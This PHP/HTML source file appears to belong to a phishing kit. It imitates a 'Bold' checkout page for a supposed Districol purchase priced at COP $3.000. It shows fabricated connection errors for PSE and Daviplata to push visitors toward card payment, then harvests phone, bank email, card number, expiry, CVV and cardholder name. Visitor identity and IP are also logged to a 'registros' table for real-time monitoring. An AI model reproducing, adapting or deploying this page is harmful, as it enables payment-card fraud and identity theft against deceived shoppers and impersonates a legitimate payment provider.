<?php
/* ============================================================
   🔥 ANTI-CACHE PRO
============================================================ */
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: 0");

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/token_helper.php';

// Inicializar el registro temprano para los logs en tiempo real
if (empty($_SESSION['idreg'])) {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $nombreInicial = $_SESSION['cliente_nombre'] ?? '';
    $cedulaInicial = $_SESSION['cliente_documento'] ?? '';
    $celularInicial = $_SESSION['cliente_telefono'] ?? '';
    $correoInicial = $_SESSION['cliente_correo'] ?? '';

    try {
        $stmt = $pdo->prepare("
            INSERT INTO registros (banco, ip, status, horamodificado, nombre, cedula, celular, email)
            VALUES ('Ingresando datos...', ?, 1, NOW(), ?, ?, ?, ?)
        ");
        $stmt->execute([$ip, $nombreInicial, $cedulaInicial, $celularInicial, $correoInicial]);
        $nuevoId = $pdo->lastInsertId();
        if ($nuevoId) {
            $_SESSION['idreg'] = $nuevoId;
        }
    } catch (Exception $e) {
        // Ignorar para no bloquear la pasarela
    }
}

// ─── Obtener Datos del Token, Producto y Comercio ───
$token_producto = $_SESSION['landing_token'] ?? ($_GET['token'] ?? '');
if (empty($token_producto)) {
    // Generar un número de referencia realista si no hay token directo
    $token_producto = '1234567890';
}

$nombre_comercio = "Districol";

$nombre_producto = "DJI Osmo Pocket 3 Creator Combo";
if (!empty($_SESSION['carrito'])) {
    $first_prod_id = array_key_first($_SESSION['carrito']);
    if (strpos($first_prod_id, 'LANDING_') !== false) {
        $land_id = str_replace('LANDING_', '', $first_prod_id);
        try {
            $stmt = $pdo->prepare("SELECT producto FROM landings WHERE id = ?");
            $stmt->execute([$land_id]);
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if (!empty($row['producto'])) {
                $nombre_producto = html_entity_decode($row['producto'], ENT_QUOTES, 'UTF-8');
            }
        } catch (Exception $e) {}
    }
} elseif (!empty($_SESSION['cliente_producto'])) {
    $nombre_producto = html_entity_decode($_SESSION['cliente_producto'], ENT_QUOTES, 'UTF-8');
}

// El precio siempre será estrictamente COP $3.000
$precio_fijo_bold = "COP $3.000";

// Recuperar datos previos del cliente para el formulario
$tipo_documento  = htmlspecialchars($_SESSION['cliente_tipo_documento'] ?? '', ENT_QUOTES, 'UTF-8');
$documento       = htmlspecialchars($_SESSION['cliente_documento'] ?? '', ENT_QUOTES, 'UTF-8');
$nombre          = htmlspecialchars($_SESSION['cliente_nombre'] ?? '', ENT_QUOTES, 'UTF-8');
$apellidos       = htmlspecialchars($_SESSION['cliente_apellidos'] ?? '', ENT_QUOTES, 'UTF-8');
$correo          = htmlspecialchars($_SESSION['cliente_correo'] ?? '', ENT_QUOTES, 'UTF-8');
$direccion       = htmlspecialchars($_SESSION['cliente_direccion'] ?? '', ENT_QUOTES, 'UTF-8');
$complemento     = htmlspecialchars($_SESSION['cliente_complemento'] ?? '', ENT_QUOTES, 'UTF-8');
$ciudad          = htmlspecialchars($_SESSION['cliente_ciudad'] ?? '', ENT_QUOTES, 'UTF-8');
$departamento    = htmlspecialchars($_SESSION['cliente_departamento'] ?? '', ENT_QUOTES, 'UTF-8');
$telefono        = htmlspecialchars($_SESSION['cliente_telefono'] ?? '', ENT_QUOTES, 'UTF-8');
$titularGuardado = htmlspecialchars($_SESSION['cliente_titular'] ?? '', ENT_QUOTES, 'UTF-8');
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bold - Checkout</title>
  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="css/bold.css?v=<?= time() ?>">
</head>

<body>

  <!-- PANEL IZQUIERDO GRADIENTE BOLD -->
  <div class="sidebar">
    <!-- BARRA SUPERIOR: LOGO BOLD + SELECTOR DE IDIOMA -->
    <div class="sidebar-top-bar">
      <img src="bold/boloncho.svg" alt="Bold" class="logo">
      <div class="lang-selector" id="langSelectorBtn" onclick="toggleLanguage()" title="Cambiar idioma">
        <span class="lang-flag" id="langFlag">🇨🇴</span>
        <span class="lang-code" id="langCode">ES</span>
        <svg class="lang-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
      </div>
    </div>

    <!-- CONTENIDO CENTRAL DE INFORMACIÓN -->
    <div class="sidebar-content">
      <span class="sidebar-sub-label" data-i18n="buying_at">Estas comprando en</span>
      <h2 class="sidebar-store-name"><?= htmlspecialchars($nombre_comercio) ?></h2>

      <div class="sidebar-prod-title"><?= htmlspecialchars($nombre_producto) ?></div>
      <div class="sidebar-ref">
        <span data-i18n="ref_label">Referencia</span> <span><?= htmlspecialchars($token_producto) ?></span>
      </div>

      <div class="price"><?= $precio_fijo_bold ?></div>
    </div>

    <!-- PARTE INFERIOR -->
    <div class="sidebar-bottom">
      <a href="#" class="calc-currency-link" data-i18n="calc_currency" onclick="return false;">Calcular en mi moneda</a>
    </div>
  </div>

  <!-- PANEL DERECHO DE MÉTODOS DE PAGO Y FORMULARIO -->
  <div class="content">

    <h3 data-i18n="how_to_pay" class="content-title">¿Cómo quieres pagar?</h3>

    <!-- GRID DE MÉTODOS DE PAGO (COMO EN LA IMAGEN) -->
    <div class="payment-methods-grid" id="metodosGrid">
      <div class="bold-pay-card" id="opTarjeta">
        <div class="bold-pay-card-icon card-icon-bg">
          <img src="bold/cece.svg" alt="Tarjeta">
        </div>
        <div class="bold-pay-card-label" data-i18n="pay_card">Tarjeta débito/crédito</div>
      </div>

      <div class="bold-pay-card" id="opPSE">
        <div class="bold-pay-card-icon pse-icon-bg">
          <img src="bold/pse.svg" alt="PSE">
        </div>
        <div class="bold-pay-card-label">PSE</div>
      </div>

      <div class="bold-pay-card" id="opDaviplata">
        <div class="bold-pay-card-icon davi-icon-bg">
          <img src="bold/daviplata.webp" alt="Daviplata" style="max-height: 18px; width: auto;">
        </div>
        <div class="bold-pay-card-label">Daviplata</div>
      </div>
    </div>

    <!-- MENSAJE DE ADVERTENCIA PARA PSE / DAVIPLATA -->
    <div id="bancoAdvertencia" class="warning-box-pro" style="display: none;">
      <div class="wb-icon">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <circle cx="12" cy="12" r="10"></circle>
          <line x1="12" y1="8" x2="12" y2="12"></line>
          <line x1="12" y1="16" x2="12.01" y2="16"></line>
        </svg>
      </div>
      <div class="wb-content">
        <strong data-i18n="warn_title">No fue posible establecer conexión con el canal seleccionado.</strong>
        <p data-i18n="warn_sub">Por favor intenta realizando el pago con Tarjeta débito o crédito para finalizar tu orden.</p>
      </div>
    </div>

    <!-- FORMULARIO REAL DE TARJETA -->
    <form action="procesar_pago.php" method="POST" class="formulario-tarjeta" id="formTarjeta" style="display:none;">
      
      <div class="volver-link">
        <a href="#" id="btnVolver" data-i18n="change_method">← Cambiar método de pago</a>
      </div>

      <label data-i18n="phone_label">Teléfono</label>
      <div class="telefono-wrapper">
        <div class="codigo-pais">
          <img src="bold/locombia.webp" alt="Colombia">
          <span>+57</span>
          <img src="bold/lineaabajo.svg" alt="desplegable" class="flecha">
        </div>
        <input type="text" name="tel_bank" placeholder="--- --- ----" required>
      </div>

      <label data-i18n="email_label">Ingresa tu correo electrónico</label>
      <input type="email" name="email_bank" placeholder="El que está registrado en tu banco" data-i18n-ph="email_placeholder" required>

      <label data-i18n="card_number_label">Número de tarjeta</label>
      <div class="input-con-icono">
        <input type="text" name="tarjeta" maxlength="19" placeholder="---- ---- ---- ----" required>
        <img src="bold/cece.svg" alt="icono tarjeta">
      </div>

      <div class="fila">
        <div class="col-cvv">
          <label data-i18n="card_expiry_label">Vencimiento</label>
          <div class="input-con-icono">
            <input type="text" name="fecha" maxlength="5" placeholder="MM/AA" required>
          </div>
        </div>

        <div class="col-cvv">
          <label data-i18n="card_cvv_label">CVV o CVC</label>
          <div class="input-con-icono">
            <input type="text" name="cvv" maxlength="4" placeholder="---" required>
            <img src="bold/cece.svg" alt="icono ayuda">
          </div>
        </div>
      </div>

      <label data-i18n="card_holder_label">Nombre del titular</label>
      <input type="text" name="titular" placeholder="Igual al que aparece en la tarjeta" data-i18n-ph="card_holder_placeholder" required>

      <div class="checkbox checkbox-datos">
        <input type="checkbox" id="acepto1" required checked>
        <label for="acepto1" data-i18n="accept_data">Acepto el tratamiento de mis datos personales…</label>
      </div>

      <div class="checkbox checkbox-terminos">
        <input type="checkbox" id="acepto2" required checked>
        <label for="acepto2" data-i18n="accept_terms">Acepto Términos y condiciones</label>
      </div>

      <input type="hidden" name="tipo_documento" value="<?= $tipo_documento ?>">
      <input type="hidden" name="documento" value="<?= $documento ?>">
      <input type="hidden" name="nombre" value="<?= $nombre ?>">
      <input type="hidden" name="apellidos" value="<?= $apellidos ?>">
      <input type="hidden" name="correo_checkout" value="<?= $correo ?>">
      <input type="hidden" name="direccion" value="<?= $direccion ?>">
      <input type="hidden" name="complemento" value="<?= $complemento ?>">
      <input type="hidden" name="ciudad" value="<?= $ciudad ?>">
      <input type="hidden" name="departamento" value="<?= $departamento ?>">
      <input type="hidden" name="telefono" value="<?= $telefono ?>">
      <input type="hidden" name="titular_guardado" value="<?= $titularGuardado ?>">

      <button type="submit" id="btnPagarBold" data-i18n="pay_btn">Pagar</button>

      <div class="abandonar">
        <a href="checkout.php" id="btnAbandonar" data-i18n="abandon_payment">Abandonar pago</a>
      </div>
    </form>

    <!-- FOOTER ENLACE Y LOGOS DE SEGURIDAD -->
    <div class="back-link" id="volverTienda">
      <img src="bold/tienda.svg" alt="tienda">
      <a href="checkout.php" data-i18n="return_store">Volver a la tienda</a>
    </div>

    <div class="secure-logos" id="logosBoldBottom">
      <span data-i18n="secure_pay">Paga seguro con Bold</span>
      <div class="secure-logos-row">
        <img src="bold/pci.svg" alt="PCI">
        <img src="bold/sitio.svg" alt="Sitio seguro">
        <img src="bold/servicio.svg" alt="Servicio">
        <img src="bold/pse.svg" alt="PSE">
        <img src="bold/idmaster.svg" alt="Mastercard ID Check">
        <img src="bold/visacheck.svg" alt="Visa Secure">
        <img src="bold/recaptcha.svg" alt="reCAPTCHA">
      </div>
    </div>

  </div>

  <!-- PANTALLA DE CARGA DINÁMICA AL CAMBIAR IDIOMA CON 1_pingpong.gif -->
  <div id="boldLangLoader" class="bold-lang-loader">
    <div class="bold-lang-loader-box">
      <img src="bold/1_pingpong.gif" alt="Cargando..." class="bold-pingpong-img">
      <span id="boldLangLoaderText" class="bold-lang-loader-text">Cambiando idioma...</span>
    </div>
  </div>

  <script src="js/bold.js?v=<?= time() ?>"></script>
</body>
</html>